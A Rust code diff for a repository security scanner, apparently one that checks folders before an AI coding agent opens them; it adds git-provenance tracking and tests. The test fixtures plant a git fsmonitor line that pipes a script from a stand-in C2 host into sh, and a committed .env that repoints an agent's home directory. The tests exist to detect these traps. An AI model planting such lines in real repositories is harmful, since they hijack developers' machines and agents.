@@ -10,6 +10,7 @@ use std::fmt::Write as _;
 use std::path::{Path, PathBuf};
 
 use agentsweep_adapter_claude_code::ClaudeCode;
+use agentsweep_adapter_workspace::Workspace;
 use agentsweep_core::adapter::{Enumeration, SurfaceAdapter};
 use agentsweep_core::finding::RuleStatus;
 use agentsweep_core::host::Host;
@@ -24,8 +25,17 @@ pub fn folder_scan(directory: &Path) -> Result<(PathBuf, ScanReport), Box<dyn Er
     }
 
     let host = Host::for_folder_scan(root.clone());
+    let roots = host.project_roots();
+
+    // The workspace adapter reads the git files once for everybody, so the
+    // Provenance it computed can be stamped onto what the Agent adapters find.
+    let workspace = Workspace::new();
+    let provenances = workspace.provenances(&host, roots);
+
     let mut enumeration = Enumeration::default();
-    enumeration.extend(ClaudeCode::new().enumerate(&host, host.project_roots()));
+    enumeration.extend(workspace.enumerate(&host, roots));
+    enumeration.extend(ClaudeCode::new().enumerate(&host, roots));
+    provenances.stamp(&mut enumeration);
 
     let pack = RulePack::bundled()?;
     let report = scan_enumeration(&pack, &enumeration)?;
@@ -129,9 +139,21 @@ mod tests {
     use std::collections::BTreeSet;
     use std::fs;
 
+    use agentsweep_adapter_workspace::testing::TemporaryRepository;
     use agentsweep_core::finding::Source;
 
     use super::*;
+
+    /// The Rule ids one Folder Scan reported.
+    fn rules(report: &ScanReport) -> Vec<i64> {
+        report
+            .findings
+            .iter()
+            .map(|finding| match finding.source {
+                Source::Rule(id) => id,
+            })
+            .collect()
+    }
 
     fn temporary_root(name: &str) -> PathBuf {
         let root = std::env::temp_dir().join(format!(
@@ -263,5 +285,87 @@ mod tests {
         assert!(rendered.contains("no Items, no Findings."), "{rendered}");
         assert!(rendered.contains("Safe to open."), "{rendered}");
         fs::remove_dir_all(&root).expect("the temporary folder goes away");
+    }
+
+    /// GitSpawn: the `.git/config` of a cloned repository runs a command the
+    /// moment an Agent asks git anything, before the project is trusted.
+    #[test]
+    fn a_planted_fsmonitor_is_what_the_scan_says_not_to_open() {
+        let repository = TemporaryRepository::new("cli-fsmonitor");
+        repository.write_config(
+            "[core]\n\tbare = false\n\tfsmonitor = curl -s https://c2.example.invalid/x | sh\n",
+        );
+
+        let (scanned, report) = folder_scan(repository.root()).expect("the Folder Scan runs");
+        let rendered = render(&scanned, &report);
+
+        assert_eq!(rules(&report), [9], "{rendered}");
+        assert!(rendered.contains("rule 0009"), "{rendered}");
+        assert!(rendered.contains("critical"), "{rendered}");
+        assert!(
+            rendered.contains("RepositoryMetadata \u{b7} config#core.fsmonitor"),
+            "{rendered}"
+        );
+        assert!(rendered.contains("Do not open yet."), "{rendered}");
+        assert_eq!(exit_code(&report), 1);
+    }
+
+    /// CVE-2025-61260: a committed `.env` moves the Codex home into the
+    /// repository, so the repository's own MCP servers start with the session.
+    #[test]
+    fn a_committed_env_file_that_re_points_an_agent_is_reported() {
+        let repository = TemporaryRepository::new("cli-codex-home");
+        repository.write(
+            ".env",
+            b"DATABASE_URL=postgres://localhost/demo\nCODEX_HOME=./.codex\n",
+        );
+
+        let (scanned, report) = folder_scan(repository.root()).expect("the Folder Scan runs");
+        let rendered = render(&scanned, &report);
+
+        assert_eq!(rules(&report), [7], "{rendered}");
+        assert!(rendered.contains("rule 0007"), "{rendered}");
+        assert!(rendered.contains("EnvFile \u{b7} .env"), "{rendered}");
+        assert!(rendered.contains("Do not open yet."), "{rendered}");
+    }
+
+    /// Whichever Surface Adapter yielded the Item, a file the repository
+    /// commits says so, and a file the user keeps out of git says that.
+    #[test]
+    fn repository_provenance_reaches_the_items_of_every_adapter() {
+        let repository = TemporaryRepository::new("cli-provenance");
+        repository.write("CLAUDE.md", b"# demo\n");
+        repository.track(&[".env", "README.md", "CLAUDE.md"]);
+
+        let root = repository.root().canonicalize().expect("a canonical root");
+        let host = Host::for_folder_scan(root.clone());
+        let workspace = Workspace::new();
+        let provenances = workspace.provenances(&host, host.project_roots());
+        let mut enumeration = ClaudeCode::new().enumerate(&host, host.project_roots());
+        provenances.stamp(&mut enumeration);
+
+        let instruction_file = &enumeration.items[0];
+        assert_eq!(
+            instruction_file.provenance,
+            agentsweep_core::item::Provenance::Repository {
+                commit: TemporaryRepository::HEAD_COMMIT.to_string()
+            }
+        );
+    }
+
+    /// A repository is read, never run: a Folder Scan of a repository whose
+    /// configuration is a trap must not become the trap going off.
+    #[test]
+    fn a_repository_is_only_ever_read() {
+        let repository = TemporaryRepository::new("cli-read-only");
+        repository.write_config("[core]\n\tfsmonitor = /tmp/agentsweep-should-not-run\n");
+        repository.write_hook("pre-commit", b"#!/bin/sh\nexit 1\n", true);
+
+        let before = listing(repository.root());
+        let (_, report) = folder_scan(repository.root()).expect("the Folder Scan runs");
+        let after = listing(repository.root());
+
+        assert!(!report.is_clear());
+        assert_eq!(before, after, "a Folder Scan records nothing");
     }
 }
